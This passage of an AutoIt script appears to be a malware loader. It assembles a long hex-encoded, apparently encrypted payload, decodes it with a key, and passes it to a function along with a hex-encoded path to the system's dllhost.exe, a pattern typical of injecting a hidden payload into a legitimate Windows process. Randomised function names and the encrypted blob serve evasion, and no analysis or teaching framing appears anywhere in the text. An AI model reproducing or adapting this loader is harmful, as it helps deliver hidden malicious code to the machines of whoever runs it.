	$j = $j & "273392D0D1FA9A860212885B8EB2CD2CC9B3F73717DF6632AE21ADE35D2F2E9D508BBDD1646C59886238C634A2518CAE72FE098E2D53427C391A31436E6962A512E3D5C54588F754DBB4C8656CDA08CDB03FC27D42BF885BF6295C6D307D94C6FEFA99D7F59C3BC2337AB8CC9858EC41D4C9125D1FA0FFC04E3CF1B3BCCEA41EC0E19B827E55754FFF2A2A3A10885E1A72EC215A59A4"
	$j = $j & "12021183F4BA775AF0DA16602293D93092643E595D266B5791EE91E7A10A87393BFA2791480E8785BFCE1A3D94469F9863ACFD90DD4D170C3649811F3D3FA8E32683E9D55460135D4156D99905119E5C6074CFA631AA0B66A1F73126FDEA185BBC2AD993275228DCC8602B0A2D6382415C38B79582DF96F001CB1971B443807DF18D28D52B0EBD92D687B80A5388CC300E3138E81F3B"
	$j = $j & "ECCDAFA042BA9044EC6C9D1B2D87427B3A05107CA058B7B5308EBFBF0E252195E02767BD89362B4C56296220B38A2A5E4F1B7993F261B5A6EA7172139917CDF9440D489956AEA753CBC4A7DC6249CB3FED27A7B731B198FDD4E4FCD5FA806D4E8D587591F1AA42D2F7B25D6CA29198A597A90433A5764777382B62DF2A193AD880DE4F368DBDB4BC08D4418D7994E7A16C9595CD8402"
	$j = $j & "19C013A8598D3D8A35C8AD72A980872688FD6B9E30636CAF53EB865255F30F912EDD2CC16F1397AC95492CE54B6DD30D105C2DB5A28F6473BCC3554CC056CC7988CFF4BA6E424772032F0370B4DB9FB1EF6B17917FCC28D74048EDF2698F12D707E387F39E31AA3D66E030B8DF72CF6B18862716ED0B1AF060B4650EE24CB8F27FF5712112094436950F5EDCDE0D1BA1C5BB758379E5"
	$j = $j & "182EDD9906E7A06C4B32B4EF0F53AEF4F7C6FF4985387B59BC412036DCDD0FF45496DB55F5BBFDFE01879E19245CE65B8A4D69B04B7305B9BAC2CD86EBB10F70F7C53B49CF33CD25E8B82848F1DC303FB076CE0F19A33B10A2240D483A31FE2F6D8C9557CC3B97BE228130FFB799CEBEBB8CFFF7511BC2C4B023F89C04428075530D31F678C45761571EB81B665B74A7A38865F063B9"
	$j = $j & "7CD1B8755D1418B4E133F1CB6C97621DE387888D4A6CC8D0ACBA3B6D01BCBEBAD4A9075641E54A390A238A1EF25A8A438B934B224A526E06874B5EA9AC4DC8D6F4E45C5B1059695E3508049747C302A3CE6692321050375FAEEA773AE316DE6824B7E200F8FACA2653EE64ECBE366505C6A2EB51DF6B50EFA032ED926CD8A85DAD345E4AFEFD82EE01E8D48D96AB25EE32D33EB53277"
	$j = $j & "FD1270C3190B8E28222731DF3EBDC8E780887C194E010B80A3E185D68D9CC6A18FD90DFF77E88376F6023C7F42D2A920DF4B0790ADB01B93E6E6ECFAAB11A7A9CC2C584F00FD16F501079E9B0562C5253FAB3FFCD513D0A3361654D62F0CD33BF30361A4B7BC30E3DD9CFB0E6FA448774174FEB027DE4C902287F9239FBCF4ADF64AA0491109DC97A8155AEE7B1B76F0493A7AF7FC67"
	$j = $j & "7B770DC3F9501B88D8A62B0C877C6D5EC4CE1C0F4562250EA13EE3D30276EE51B7DDE1C8DF75D6D5DC2C71AB427036A7B9E03CB30380B418825AB22E7DBCBD7694097B7E80B5D87C10A017E029C0F6AF05CFE18ABD9BD6BFB56F2459A21ABB716A8E8D5941DCBBCF9F4AD3CA1CC535BAAFEC27B62C16E46464F7DD80D2FB08289AE7078026A47D21CF01BE3177A45C0404AB7521DA72"
	$j = $j & "1D1E27F81509A04F3C3DC608D38F341B853A77A957A4CEA8617BBC66FD88387A9DE671B410991FD215D3705CA7CA16616739461EE92C2C6F0DF3A24AF969BBF12120715077017BA4881EEC6AEBDB87DD6235A145B6BAC815498557C13890E499C971002478797709E4A3C8FD7A0CE5738357E27BBBA5BB57D1A70099A3904DBA8A5AD9D1E3B29E930E116CFBFBA9EE53ED5E9A485068"
	$j = $j & "2495AB22A9EFF4A78EA2996E07AC4C16F64D156A8368B6619F529243014B049314926BCFB68CE90AEB8B7B5540776E9EBA376FE6942670F7A72F70F0602805013C12DCC297405A21D8203C447C1E8FFA19BECC7979E11A363CF4F2A541A4344B87DC26A0411B4E888462BC23DCB302273EBBDBF0438B07CE13C8F9BB57F50B04022FE622B5134236DF75000F2402510C6479C25E0983"
	$j = $j & "EB5A6037992D5D5B933B39A1601C7150F3915A217DDC5814D234A2CD806D7768B1FFD16D3D24B133D3CF120D23E7714DBAF4A9E7877DCE429779712DBC65C758861188A886667436F86F4F3F652DED84AE84D5ED005E2F8222BCF627ABB24697DE36FD38027BF331D5FF080DE8FD63C69294FEA0D5A14A4850C8087EB8EF6F6C20277A85882EB3743B0316255176BE508E4EF91B2F71"
	$j = $j & "1050D76F2C556CB2F046F536360AE4E1A0E0D02C5294D7040E0E4ED6EAFE89FF0A578FBA439B4D405640462B77763F3AEACA3159EEDE38C25A72C96631778E04D49DDF2A01EBE7A87437F954361DD9E2C8DBB7D354CFB339D77BC6894170A892D4587B80E09D44F34B324C1BF08E1A3063660BA03FE5F55D9502B71E5A113265FC3C00EC47B4A6B015862B5AA2889D24DCAF8D5B7822"
	$j = $j & "E1B1CCD164F0F6604C6BC7CFD5A8B6E09F6FCC8D4991D4DF27C3B3BB555E12FC5579AE23B849A74594CA8744A5DDE7DB954214BE04ECC9DBCD6CC123BDC861EFA93528F7C59C753415781907F59027E1D1F26104580D6025BF47975C625FD36431DC0D8369AEE6E58C4596C1A14130535BB53571A7DD33F6F3E17BBD009C1AE7F44B30B80A1EAC4D48D6ED51B9AD543D1DCD4B5D6270"
	$j = $j & "39C0D4740B5B8B8541F383C0DF4B8F0514E0B69B4E88343678C4FD9418CAE2FDAEB9D2DD22E52B934084B5CEB8F72C4D2F08EF49610C5936C842A2E7E8889091D8CFEFC140925B452D2D8A8785EA4E1C35C4FB8C78CEA6FE52E5C908868EFED1F9F504ED556B187AF385BF2E7EE78499075416EAA5905296387B6EBDF1EDE65FDCE340A0DBA2A273EE16E40097FC52CE28C27AD285B9"
	$j = $j & "7F1C1C7CC20AA937DB16D95D07D6896E814AC13A3DA23A0CBC09F45C3279AEBBBBB4B027699A9501F90A4FC0EA2E092BB848F3F251783D5939DB1E6AE28347E3DB60D9ED83DABDB0350D0A9EB1F64307FC22DA656EF2254DB02852E2B360A5DBEAF086F3E78CF3EBF636FD34D428A4B0C0FD1D8B669E356652DFE45860B83C6FD42A7271E06B356B87468F1974C935C2D23666B0787B"
	$j = $j & "076F904A524B75A6591D184B988D6BCB8583F6C2A3D085EF8DCED9FB0AEEB152E945506816FAE43360F47C864096E2EA66611935D8022265F7B70A048F7B7FE0BA64A68A8E36E086601203EEBAC5B312DD7BE16B745F91E67A2EF088ABFE507974DD1FF5F95417130D4ADCC5006FE4BA4CAED2CBAFDFE86D75F50652F8B18396773B805C811EB4867621650F5BF1FAB3066A977AC565"
	$j = $j & "9F8470E8FEA04B00D3D0A1FD09E404D457A1B272ED9BBCAB13E151DB23FC1D5E37D501E6D2BF1C7B6656FF42D377784F335096F9EF37E328CA1FFC41B8C000FCEF9973B6F9AA4FEA2FB795CF6E9A5E11BE79946883D6EA858EBAF7AE2C22FFD8D3F4A46CA189047673803065D738FAAC0A0B8F4E20B086E921CC1FF634E912206F5A76781E0DA8E410B58D9A8E7BF813AA7DA61F1641"
	$j = $j & "CD22666651E84C0E854F3A7BE92F5A5041EF8F328701DCD112C66F1A3EDF6514A9C8FA546129D56948782EA46DB697D5FDD1040EB0381F4D7BDEB70628CC9A13485D564CFCEE61A23D110BA12339089F16E96A1A904CE33C46C777F7FC616A28DF2945FB52BDBD803383497248BC175F21109305987E7D12CAA54502AA5818FCDAE5C96C584EF7DDD60CCB8A729C7E645DCF198C918B"
	$j = $j & "7015A7BCF371902E6BD7F532F03C62A8CC9978B2148F5A41A08183564BD8F2456956C190A8CE436CC2B1D37FC58FAF78490FC14864CBCFBA22E7A72046313A28184A3E661D22F8652124E3FEE477FBCE274C69600D435ED9956186A2136AF8B7F510EC490641404E1F0DBCBD3C79821581C39EC8E8498CFBB123290B287A5507EF296F967B34CD7F5448D615E3DC1B4DC03C47FC4C67"
	$j = $j & "DDFC65D7CD3B575844CF16485CEFA3FA67E122EA7D1CD8136E6B736990321A7B8760F4264B479B6BB19C713A849AAF462F82E689315227C32C7D79E9D4F99C74A64050A69395BC774319B6CE6E7DE37800B46AE2DAC8CF1AF581C60A976E89A368E94BF440EF2B403273FE5996160C562F95D32224F7174F6C4898442B6D0A244BE61A5F679E931AE5D5A62A67C5E7C069FDEBD48C16"
	$j = $j & "150A1663AD123AD1E914030047C26EA489E1C8B086804C7F3463A7ED8AEDE1F68296704EE57C69340E140B6906CD20156FF044EBC47EFD38DAA68145BDD257B146EEE15A5BBBCC05DE66CA41FD8811BBDEF053E2F2DE5E88EB2F8C55EEA71ACFECACDF354A805B220AA9D2875F8B7DE329C4D492096D956DD9ABFDD727FF961012FB4EB5733FA77B036B5E241E2D98107C59511FBC68"
	$j = $j & "72163E9B595A61D6DF39D136F6DF1A90F057DAECAAD13E933573BC4EA3D6CBE6E96B43BD26958543D9EB211069A0499D640367B93C4DB9D3C787CEEC54314B957071D8B9A3947DC86E7251696CA31E22E2B50F9187A9C6C652CD4C5841D4B5214B7384E2A013ECA83001D92D460D88FD359483A5606040E965DD726243611D77F1FFF59A4422D7EA6E167622E4A7185DC42092495664"
	$j = $j & "675A6CB7718AD8CE067168B4E87173E1084A0275A3D587680CC68940A7436BAEB07058EA68058B7945DD7C73B9E85FE81552E3A6251A02245EB6F7BFB0E8F197D352AA86FD4E4A73C49AC18A1241AF1D28E46FD67873EB5E7CB3AA17D8BF27025B9EC0964EC617DE93EF2D58DF5FB28BE403115E545743AD7E356086DD91CCE2FF03D3E71189138AA5E83FF1525B8A4E80A8BF0542B3"
	$j = $j & "E03AAC827F5C358303E0C51E482A158F5751EA8412A74EF669FF0DA7046C9D8DC8C58A50608C443F257E3A28E300C54C1594B56A81EA4980A45D4652C2C74636DDE290DBCFE6B42483C263DC5D15DAB2B9F9B583472FC6CDEF4B12D01EEF572BBFA8CEC9BE6C60C01671B9D943032E2E7DDC00C37DB3B2BB6AE173B24D4C9008EEA2A64E07536A06C931EE12B369A30A8FA108C64617"
	$j = $j & "916D41B3E5E04CB71CF5E8E63AC31186EA7BC3F4AC6A8A4CE39F52F3B7C76CD99AA1071161E7072CAEF31AFFCB11FB319BBBDFBA8A39DED1A0FF28163C6E0E51E156C182504FD99CDDBD323D1E7F953A0C23BC082C751FC9E6E9E32F8E2A416BAAD38A57CF99D71FAF39E863503481E24FC1654B908D118C79F70D4682E3A6B26D5E4AEB324DBE2D815383D317B4A8E6F94B01CA8E7D"
	$j = $j & "DFF55F33E548A072F6321B213C3569F92B7F6D4A4C88CE6F4FFF121F3742CB3F76794868DA2807A45BD5332460F8D80CF9670869A192633FF5F365CC1196F84D4D22273C0C6DAD55DA886AFE2A5C963195133F2F03F42C7A22AF23F06C9181BCB432825E37AE1C55BF0665E2A1871A0D74A994140CB1492A6CB1C3F8267A2F078F376EA78F21695F37DB0CFAA061D3A3C637FC8E27B3"
	$j = $j & "BF4BB4B9EB0B0682D44F3354362D56D85FFC56FAE74730CCB81C24407A26BD4BB35503BEE2A5779E52A962E3F27FD68A4E64D4D0166116EDC918ED275F1319D90E3246312720AE5FA46C5CB6353C0BC9569483B472AE0CEF6B35C38627383AFF6B64B7F0BBA43D0985AE88C821B390668C516019DD974B230FB64CFAAFC67394AB8B295C500206CE246C7A3885AFB496BDCDBFF205FC"
	$j = $j & "239CF3AA66623DC622A0C4603867005F356231DC9FE57B55E3C80B1DDA3C81A28E6F2E263C2B61EBAFA04C15FDF338D0C7246E2921FBE11BC36135511C0ED824255E255E863D75593347D076B3C1C23F30ED283B14767A8FD3D8AB6CADF8EA3EBD1FACEB4CD1916638D390588A0B1117E205D44BAA3D160FC54AF853DD9E9AB2141D0F212FCB6AD5AADF21D181C1D05C68B3E1DCD9E4"
	$j = $j & "A85410AAE3E3CE7FCB103F817C8F92DEF9CBC0E3BEF9C2003E44DA3CD886D58A52C7CD3D9D10D115A084718907E9C4A0A7C01997A237ABF27B491B041E99CF846385D8E966AE8838B5CC90F1AFA789A648AADEDDA68AE2B077FCBBBF5854AF7D1ED474B93487FE7FCE584E2751A64787C0453E5A96CF37B6D046B1107C3C8DB1D8449F60D975BD3FB2B1F0524F85E4028D0448A17A5E"
	$j = $j & "C4F69756E6515E201D822806DEC0555499E516D95B296EFD810D3438DFB45D2E11C5CCFD4C877860AE0AA6EA999D60ED9AD4E2E504B64692C19D6EB71935C019176EDDA0FC248E44AB82901CD03403F0A5A08FA8DEE7917EFF5C7F188BEC88724909640106652666B072D6B7EFBA1775DEEA5247AB4A4126909477B3BF55B8C2ABACFD2A8540ED2D17465CD2065E4C7BA9110A98A45D"
	$j = $j & "EF6268E78AF188826B70B93C2EC57FC67E274E7481A0395D063473A156433B576C157E0E68D4F492C1E6384709AA683F157CB3E6081984F0D0BF439557AD7C47BA02A998DEFDEEDF9C7B002A7EF4BD1ADB8D557FA922D1FA0296E3148B125D1B9917C8B62602509D48177C750630ED61263EFFBC6810826E9B7DF79F6CD6453EB75481207A70DAFA606767570644157765D3EA072CE0"
	$j = $j & "013D319D901132A45EEC6DC8868370786CEA36F602ECCCD31CF12B438BB50BE7F00207F18F43063815D489F23D162014E81EFD35C37FBE704D118A16FB30CA30D5CB0463920BE9239F654F76AEE7594BA9F68F84087C314E4C6AD466289B56869ECA3C11B6A610219E24E71D4659EF91E5DB98AC3B8F45A5130687B5F1F3BC8BB85E4DDE7AD547386BF0078A37B7AE75518A037011D8"
	$j = $j & "82D4C64C78E470DACA6D6394B141F2809D235F8E5751ADD2F8676DE56171AB51956CA600C7E2DAC38D64AB2CD7B6687696F75460CA9D9DAB453C6640C1658F23AA7F0D0D14CD1824FECF2B382F532AF49D133183194AB32A36D2CDD3C1309D674B1D607EE45C34A31BCCE751F3AD65F97AB929FAFBFC07517906F1C995C6C2505F781E2480EBD3E50C8001F5D0608D4D91B77039BBAA"
	$j = $j & "AA8A86984E55F5195E13CF7A3747374D928521F2D4B3D373BB2627DCC46C18A6191E55B56CA19897CA1C2C70D8A713C07CCFA89EB5018C4738F070FAF866BD2C400F0F3682EFDC633E08EDB0912BDA1F60D802D368B4683DEDDAE904B1F9BFCA70CC15854736A683F669186545C2AF0001F3CA12BE9A82C70958F59AE19DF9528E0051F2F67478DF8B0D1D914233B0527AB4CEF8CED1"
	$j = $j & "5B3519F5A53B0D7626F914F22C7675A5740E9FB9BAAF444ECDCE85EFA8DBC0A3F6E269010861DC94151DCB9399C43549272C683718336EBDC12C1B4283BD6AA8177513B4E42D9263395DB09C17E2020BEB5BC5C03168358EE50AAE1A234CB37F65333259E0A23138BACBA74307B4724160369C517EAF89EBB0CE2385EED786731A887B3C4F8B2360F9A70B08CB3E5E23D51D1334276F"
	$j = $j & "4A5408AB5D5118CAC9FA10112E0B05239537CD37F763BF91CB78DCAEE3A1F4C523150001163CC9EE7D01FEBAED37EE2F14CCC6B80678211A92A6FA60594F43EAD52BCA8FD64C2F9C057761945B06A1C448CA39DED2158097948FC4CA47BBAA9DA5EBB5142F72B0E87BD62C7C6502C7D72FA5A9C6330168AED71136FE0BF399F224D042F4D8241A7E1EB987A4F2F00AF898F2EEC5EC6B"
	$j = $j & "04A7A455DAE34C7D68D2154701FDA8F09BCB36399B3DA5D36E92AC01447872FB96241DA17CC4ADDA65E087A5608F90FBC630C19E8EE9B68FF9F52DD27FC373128111CB5567AF0237685DF5A26512108AE9364F072A2B5ED77DBC07DF13E1BBE0A3DA77640BD90637A125ED314DC9201DA4F8DBB531AEBAC1A26734A8F61B0060E725D4FAF8AFB146DCAE0E4352B0B44EF125702723F5"
	$j = $j & "EB86397D047A36D3AB056EF96E85E3AA5D7D2CC2A7DF4ED328D330D503B0EE8DECDD2EBE8BAFB9DF134D2BFFDFD038D9DDBA429CC1E32929F02F713D97B2E1464FB5CC2C575F348C7E6B5693E7AEAF0F26595B48AC33D3F7E2873D9318F95698321316803EED5748B75C594BCC94EEEB93042F9D33D9C52D34AE49EF5D00588097B31BAE0910FF308B4B484E56762D306A2473C2237E"
	$j = $j & "C25E06C365CDC630626FC2CD1ADBBFED1BD7C25DB73B409937E0CFB2C3F946794A5BD76E4028F4F4E7D27C33FBCD00E29F0B503B3C9AC0F0B30AB3E1167F5A1DB873C69931673AE607D7C7128885A5716CE59A4BB270F1AD2D2ADF05A02538B394D126E24FE2417F3769FAC09EC7481F0F7CB9E3F3CB4D40023F4B497549C968169D3645E6FEAADBB2C966FB3909D55420860C5959A3"
	$j = $j & "128E118A1B18E9D91DD897DA40665B896E0A25C9E104DD751E9CC8D30980092DA146962D24D297967260062951A3969F515799511D779776DFF524624049423A5420C62E611AE9A108DD4F7DD1A69BFFB93F6BE605E9D80CA351C26ECAE4056D736C0C39E41C198EB061202DF7745EB186D53E310E5A94D4BCDDCF0D41120E8E7FE918307634946EE7EFD997D8905FBEB9AA614E47E4"
	$j = $j & "75734EFEBE5F224BB3F18CE1595809C9EA84980BFFE0E15D028156F05875F6C067CBD61A9FDCED0A1838667A296E193FB7CD45CFF80F266A39E5F30629EA4828E5CF4FFBDA3B72D2061CBEF66F755FB425B16D53609267E8E6322C85A227161914F6ABC83F1927EF7E01EC34F91E1042AEE3301D149E68FBC86438A9DAA5CF4DDC57C3B050727844A78692AFD794BF58D4D1FAFC94EC"
	$j = $j & "B4726286D3410B876C1F1F14117DE6E67E50B87805F3757A7964B9B8B62C52F2341D22559B9BB0185C32A91D829D1AC6B4FAF3362C53C6E509E971E40F5A1D4085A92E726954CC05B8FA9BA558DFB9F4ACF6C393370C67BFED1698A063EA067137C8B025AED46F1BDBFB8A3B71C0FF5D944D0AF200165EB7E787BA6CFA141EB8A5177E662BCCE89FCBF9130177F4FBD441E5878DE3E5"
	$j = $j & "C4EB3711B0157A36DD251B524280E5CF561BFE1FB8B0B40C944787AFE8BC79AC5142753F6B5F78F4DAF325FCF956D253F27C7D337903BE91C97F8417933A98BD13F862A48B7420652828A680A445A9E63728C61EC488086E2176684703FD49ABF9974907E56CF4FA3B999072F1E14C0ABAC3A4FCCEB2526BF43A16D6C155901A1045022E39C2255E31F2BDBC868A7A50360E89A88DF7"
	$j = $j & "F57FEB846D243142ECCB421C52A542D8EAB526C9A531F62A55A1115642B4FC91FAA9BFFE605B4DA78CF549DE5D35231CA3DB54B64D3BF989D66524C0CD94BF0F4662E767B5CA3D2897942BDC1BE5FAC522965EE2BD6569E2E8BDF05A68441590E7FF3A03F7DBD6644248DA145E0890DC08125161B70642636A3657B2B866D91049F9F83225325567ECD551BCB876BB9731CAE5C6BAAA"
	$j = $j & "2F0D42E25E0EB780655261CD8A9170081CE2FE9500174643E317A6B9748A6AD1D3AB89631B5CECBE7265502E7C23E1F689FD35C3D49CEF6F9CE4CCDF07086EC04CEB825D3C51A967CB2CF7CE62E2D397AE22CBC0946C8A92D1E68CD4F652BA9F144BFC99D98BCAF9BEAFF3C93F5FFF1AFF4CE706A91B61E4EDD630E18106D21B1A4563696825EA002B6F659EA84904D57521410C2A5A"
	$j = $j & "4F338783FB65078841C4D5A8BC069292A762797CC6824D52E4FE328C7BE08F6138F3384781159C327D149C0A42502246068014693DA3DFAAE6E4A6B4DC1DDF774C8051CBB73EBBE7A682EAB434F9A5573DB0735205D45434AC878CC821533C685C65765AB22B80B680C07B587B52875079AA0A27FD570A7F07E913D165CF68676A80A05386B429ACB2656047DFCB265DEC1B867338A2"
	$j = $j & "7DF9D64C2AB5795444CB61B72059DEE8D22A7A3A56A6DE3B3F43C44A08BE9F3693E59784A3734EAC64F6FA488827475EDA0E62CDBB7AAFC13B48971041C96D83CD654D898B8811AADD33FFB8E92E57F44D00E0F445F45E2FDF3D3A4659C7C755C659A20FE9D91D8B7382C3A2BD6F72026F465679C35A36C696A99F6A1660DA0F234DCA4A85F2621BCCB4DE8D38D3BD1AD913E62AD2B2"
	$j = $j & "14EC6C591F56253BC90F5BA0A2DCECBA9F2B9F486F565B4087CFEDFF90755BA1B1F676B14E09BA3DE930C30CB9DA587B460F4BD51DC6CED0D2F856D7F66392E9BD93E052BC3F06361D0F10734D03A34F70E4FCF5E4D43556C23FD366C4571335A9351D0CA20AE98CC17FCE123986C2971A08E29DAD470BE8ED4108732123A490FC0ABA97A57BD98565B92C95F263732DEDB0C436AAA9"
	$j = $j & "479A934BA5E0E103BBA9757214A3F15420380B171B38F038A14EAE704C8987D34350DC3D06BB8D0669484FF8EC61833A9DA8D0CAA2A9C4D8C61F11E78E6E4E137EB061927A78584C819484FAE9D05F0D4CDC0C60EE49B72142DEB9932DB24C6EAFB0C30B4AD1A5D2A4425164C91EBD89F25D4D7C7D324BE36F511C845F7F63DCAA9D202293045C9B5B259180D08D055C3ADA582E7F8A"
	$j = $j & "F4B2BCB9F243EE28D31A9307AC8857034866A58D175F323C7C0870D2157071F9B4E03542B9BF649D53685DCDDD322E142C56E9A365EDB91EDABAACFCD8535E4181A810DDBAEF5870F3FB4BA92EDE3B030FADB428BF4F65DAC250CC184BADB05E0930CF81C734BE01F63D57A3C485DCCFFB2E8E93EE2514416CFBA3CA5D78A390F4B85456015B9A746465C1E14DB5F8EE40E1x0"
	$j = ewfugmibne($j, "LRMKTJVUQI", "-1")
	srwnhmjlgx()
EndFunc

Func srwnhmjlgx()
	Dim $ytbvazaialkmlpfhhvma = $j
	racrzjaclw("0x4053797374656d446972202620225c646c6c686f73742e65786522", $ytbvazaialkmlpfhhvma)
EndFunc
